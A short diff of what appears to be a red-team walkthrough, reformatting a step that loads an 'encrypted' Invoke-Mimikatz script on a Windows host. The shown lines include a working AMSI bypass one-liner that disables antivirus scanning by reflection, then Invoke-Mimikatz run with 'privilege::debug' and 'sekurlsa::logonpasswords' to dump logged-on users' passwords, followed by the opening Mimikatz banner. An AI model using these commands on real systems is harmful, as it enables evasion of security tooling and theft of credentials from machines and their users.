@@ -71,7 +71,8 @@ Step 2 - Check that the encrypted 'invoke-mimkatz.ps1' is working properly by ru
 
 PS C:\Users\Administrator\Desktop> $a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)
 PS C:\Users\Administrator\Desktop> . .\invoke-encryptedm1m1.ps1
-PS C:\Users\Administrator\Desktop> Invoke-Mimikatz                                                                                                                                  PS C:\Users\Administrator.PO718687\Desktop> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"'
+PS C:\Users\Administrator\Desktop> Invoke-Mimikatz                                                                                                                                  
+PS C:\Users\Administrator.PO718687\Desktop> Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" "exit"'
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Sep 20 2021 19:01:18
  .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
